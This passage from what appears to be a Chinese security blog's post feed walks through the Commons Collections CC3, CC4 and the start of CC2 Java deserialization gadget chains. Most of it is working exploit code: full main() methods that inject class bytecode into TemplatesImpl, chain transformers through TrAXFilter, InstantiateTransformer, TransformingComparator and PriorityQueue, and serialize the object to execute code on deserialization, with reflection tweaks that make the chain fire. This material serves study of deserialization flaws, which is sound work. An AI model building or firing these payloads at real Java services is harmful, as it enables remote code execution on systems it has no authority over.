class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734760804535-f3dbdc29-3cef-4234-8712-af271e14fe9a.png"></p>
<p>这里实际就是换了一个代码执行的方式，有些黑名单可能对InvokerTransformer进行了过滤，我们从ChainedTransformer新开一条路来执行代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734761204606-5db156a3-e24c-45e0-9e9b-2d8a0f8283f4.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC3链补充</title>
    <url>/2025/02/26/CC3%E9%93%BE%E8%A1%A5%E5%85%85/</url>
    <content><![CDATA[<h1 id="ruvzV">CC3链补充</h1>
ysoserial中使用`TrAXFilter`类，来触发`newTransformer`方法，最后也可以成功进行类加载

<p>这里我们也进行分析一下</p>
<h2 id="TekEP">CC3攻击链分析</h2>
<h3 id="Bf0xu">调用newTransformer</h3>
我们来看`TrAXFilter`的构造函数，构造时需要传入一个templates ，然后调用他的`newTransformer`方法，但是这个类并没有继承Serializable接口，如果我们能找一个调用其构造函数的方法，我们就可以成功执行代码

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrAXFilter</span> <span class="keyword">extends</span> <span class="title class_">XMLFilterImpl</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TrAXFilter</span><span class="params">(Templates templates)</span>  <span class="keyword">throws</span></span><br><span class="line">        TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        _templates = templates;</span><br><span class="line">        _transformer = (TransformerImpl) templates.newTransformer();</span><br><span class="line">        _transformerHandler = <span class="keyword">new</span> <span class="title class_">TransformerHandlerImpl</span>(_transformer);</span><br><span class="line">        _useServicesMechanism = _transformer.useServicesMechnism();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="Y9hKV">调用TrAXFilter构造方法</h3>
CC3的作者找到了`InstantiateTransformer`这个类，看名字就知道这个类是用来初始化`Transformer`的

<p>它会判断你传入的是不是一个Class类型，如果是的话就会调用其指定参数类型的构造器</p>
<p>我们需要new一个<code>InstantiateTransformer</code>，将构造器的参数类型和参数传入，然后将<code>TrAXFilter</code>的class类传入，它就会根据参数类型去调用TrAXFilter的构造方法，并将参数传入</p>
<p>最后一步就会return我们构造好并进行实例化的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InstantiateTransformer</span><span class="params">(Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (input <span class="keyword">instanceof</span> Class == <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(</span><br><span class="line">                    <span class="string">&quot;InstantiateTransformer: Input object was not an instanceof Class, it was a &quot;</span></span><br><span class="line">                        + (input == <span class="literal">null</span> ? <span class="string">&quot;null object&quot;</span> : input.getClass().getName()));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> ((Class) input).getConstructor(iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> con.newInstance(iArgs);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据如上解释，中间部分换为如下代码，就可以执行恶意代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">instantiateTransformer.transform(TrAXFilter.class);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44744277/1734763748893-88c97446-75ab-436d-94c7-227a4d1e0d62.png"></p>
<h3 id="Y9Hlp">调用transform方法</h3>
由于cc1的老毛病，我们还是使用`ChainedTransformer`去调用其transform

<p>如下代码相当于调用了<code>instantiateTransformer.transform(TrAXFilter.class)</code></p>
<p>剩下的和之前的是一样的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        instantiateTransformer</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>最终代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//可有可无</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationInvocationhdlConstructor</span> <span class="operator">=</span> aClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationhdlConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationhdlConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationhdlConstructor.newInstance(Override.class,     mapProxy);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2024/png/44744277/1734764093355-739d98ca-3de5-4fc0-ad78-49f99ce49d91.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC4链</title>
    <url>/2025/02/27/CC4%E9%93%BE/</url>
    <content><![CDATA[<h1 id="Axna2">CC4链</h1>
之前讲的几条链子，都是在commons-collections3.2.1版本之前的攻击链，cc4是在commons-collections4.0版本中的一条链子

<p>实际上，这条链子还是换汤不换药，只是中间执行的方式换了一下，后面还是命令执行和代码执行两种方式</p>
<h2 id="nAbc8">CC4攻击链分析</h2>
<h3 id="dfZTG">调用transform方法</h3>
这里用到的是`TransformingComparator`的`compare`方法，他的属性是public属性，且这个类继承了**Serializable接口**

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="OCbWk">调用compare</h3>
现在只需要找到一个类的readObject方法中调用了compare，实际上在`PriorityQueue`的`readObject`方法中调用到了，因为它也是在其他函数中层层调用的，我们这里就直接正向寻找了

<p>以下是函数的调用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        ......</span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">            siftDown(i, (E) queue[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">            <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">                comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">                c = queue[child = right];</span><br><span class="line">            <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            queue[k] = c;</span><br><span class="line">            k = child;</span><br><span class="line">        &#125;</span><br><span class="line">        queue[k] = x;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="tzKwQ">小芝士：</h4>
有同学可能问了，为什么这条链必须是在common collections4.0的情况下呢，我们看一下区别

<p>因为在3.2.1的版本内是不没有继承序列化接口的，而4.0中继承了序列化接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//common collections3.2.1</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//common collections4.0</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformingComparator</span>&lt;I, O&gt; <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;I&gt;, Serializable </span><br></pre></td></tr></table></figure>

<p>现在来写一下这个链子，和之前的链子也是大同小异</p>
<p>我们现在只需要把chainedTransformer放入<code>TransformingComparator</code>，再将<code>TransformingComparator</code>放入<code>priorityQueue</code>优先队列里面（这两个类的构造函数如下）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(<span class="keyword">final</span> Transformer&lt;? <span class="built_in">super</span> I, ? extends O&gt; transformer,</span></span><br><span class="line"><span class="params">                                  <span class="keyword">final</span> Comparator&lt;O&gt; decorated)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">        <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(DEFAULT_INITIAL_CAPACITY, comparator);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="title function_">PriorityQueue</span><span class="params">(<span class="type">int</span> initialCapacity,</span></span><br><span class="line"><span class="params">                         Comparator&lt;? <span class="built_in">super</span> E&gt; comparator)</span> &#123;</span><br><span class="line">        <span class="comment">// Note: This restriction of at least one is not actually needed,</span></span><br><span class="line">        <span class="comment">// but continues for 1.5 compatibility</span></span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &lt; <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>();</span><br><span class="line">        <span class="built_in">this</span>.queue = <span class="keyword">new</span> <span class="title class_">Object</span>[initialCapacity];</span><br><span class="line">        <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>实现如下，这样的话链子的逻辑也就走完了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="RlZd7">后续调整</h2>
<h3 id="VMeEP">自己思考与尝试</h3>
但是运行后却无视发生，应该是在链子运行时有一些条件导致链子没有完整的走下来，我们可以通过动态调试来找到问题出处

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794089444-92a1ac26-438b-4c35-8741-ad4ff460665f.png"></p>
<p>最后在这里发现，由于size的原因，并没有走到<code>siftDown</code>方法内，由于size无符号右移以后，为零，所以并没有进行遍历操作，因此我想我们可以通过反射修改size的值为2就可以进行遍历操作</p>
<blockquote>
<p><font style="color:rgb(68, 68, 68);background-color:rgb(249, 249, 249);">&gt;&gt;&gt; : 无符号右移，忽略符号位，空位都以0补齐</font></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">        siftDown(i, (E) queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反射修改如下，修改后成功执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">size.set(priorityQueue, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794482096-4a86661d-c386-45fd-8975-9e7a8fede2a5.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734794516690-2b97352d-4456-4fd2-93d1-71fee6ac7cde.png"></p>
<h3 id="p1qOE">实际</h3>
在这个地方，白日梦组长是向其中add了两个东西，使他的size变为2，但是在这里add方法也会触发compare方法，就是我们说的cc1的老毛病，也是可以构造时传入无用的东西，等add完成后反射修改回去

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUp</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">        siftUpUsingComparator(k, x);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUpComparable(k, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftUpUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">parent</span> <span class="operator">=</span> (k - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">e</span> <span class="operator">=</span> queue[parent];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) e) &gt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = e;</span><br><span class="line">        k = parent;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将反射改为add方法后，也可以成功弹出计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1740629922114-eb8aca3d-7b1e-4604-a10d-63c1e51d7fc3.png"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC2链</title>
    <url>/2025/02/28/CC2%E9%93%BE/</url>
    <content><![CDATA[<h1 id="HHDQS">CC2链</h1>
<h2 id="UMv6S">CC2攻击链分析</h2>


<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734799667661-9d10de39-d60d-4e91-9b7a-6c7043603e66.png"></p>
<h3 id="TRYXk">add流程解析</h3>
之前这里没有搞明白，这次这里动态调试了一下，发现应该是差不多了，回来补一下

<p>在这里add之后进行了下列操作，就是将add的元素，放入了queue数组中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> offer(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">            grow(i + <span class="number">1</span>);</span><br><span class="line">        size = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">            queue[<span class="number">0</span>] = e;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftUp(i, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
